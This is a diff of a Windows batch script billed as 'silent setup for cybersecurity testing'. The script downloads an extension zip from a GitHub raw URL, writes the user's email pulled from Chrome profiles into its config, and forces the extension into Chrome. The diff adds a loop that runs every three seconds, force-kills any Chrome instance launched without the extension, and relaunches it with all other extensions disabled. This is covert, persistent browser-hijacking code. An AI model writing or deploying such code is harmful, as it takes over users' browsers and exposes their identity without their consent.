@@ -2,7 +2,7 @@
 setlocal EnableDelayedExpansion
 
 REM Silent setup for cybersecurity testing
-REM Downloads extension.zip to Documents, extracts, and runs Chrome with extension
+REM Downloads extension.zip to Documents, extracts, and enforces extension for any Chrome profile
 
 REM 1) CONFIG: GitHub raw zip URL
 set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/extension.zip"
@@ -68,7 +68,7 @@ for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
 if not defined EMAIL set "EMAIL=anonymous@demo.com"
 
 REM 6) Write config.json
-> "%EXT_DIR%\config.json" echo {^"userEmail^":^"%EMAIL%"^}
+> "%EXT_DIR%\config.json" echo {"userEmail":"!EMAIL!"}
 
 REM 7) Locate chrome.exe
 set "CHROME_PATH="
@@ -82,15 +82,42 @@ if not defined CHROME_PATH (
   exit /b 1
 )
 
-REM 8) Create or use custom Chrome profile
-set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\MyDevProfile"
-if not exist "%PROFILE_DIR%" (
-  mkdir "%PROFILE_DIR%"
+REM 8) Monitor and enforce extension for any profile
+:monitor
+REM Check for running Chrome processes
+powershell -Command "(Get-WmiObject Win32_Process -Filter \"name = 'chrome.exe'\" | Select-Object ProcessId,CommandLine)" > "%TEMP%\chrome_processes.txt"
+
+set "FOUND_PROFILE="
+for /f "tokens=1,* delims= " %%A in (%TEMP%\chrome_processes.txt) do (
+  set "COMMAND_LINE=%%B"
+  echo !COMMAND_LINE! | find "--user-data-dir=" >nul
+  if !ERRORLEVEL! == 0 (
+    REM Extract profile directory
+    for /f "tokens=2 delims==" %%D in ("!COMMAND_LINE!") do (
+      set "PROFILE_DIR=%%D"
+      set "PROFILE_DIR=!PROFILE_DIR:"=!"
+      for %%E in ("!PROFILE_DIR!") do set "PROFILE_DIR=%%~E"
+      REM Check if extension is loaded
+      echo !COMMAND_LINE! | find "--load-extension=" >nul
+      if !ERRORLEVEL! NEQ 0 (
+        REM Terminate non-extension instance
+        powershell -Command "Stop-Process -Id %%A -Force" >nul 2>&1
+        REM Launch with extension and same profile
+        start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
+      )
+      set "FOUND_PROFILE=1"
+    )
+  )
+)
+del "%TEMP%\chrome_processes.txt" 2>nul
+
+REM If no Chrome is running, don't launch a new one
+if not defined FOUND_PROFILE (
+  REM Optional: Launch with default profile if desired
+  REM set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
+  REM if not exist "!PROFILE_DIR!" mkdir "!PROFILE_DIR!"
+  REM start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
 )
 
-REM 9) Terminate all other Chrome instances
-powershell -Command "Get-WmiObject Win32_Process -Filter \"name = 'chrome.exe'\" | Where-Object { $_.CommandLine -notlike '*--user-data-dir=\"%PROFILE_DIR%\"*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
-
-REM 10) Start single Chrome instance with extension
-start "" "%CHROME_PATH%" --user-data-dir="%PROFILE_DIR%" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
-exit /b
+timeout /t 3 /nobreak >nul
+goto :monitor
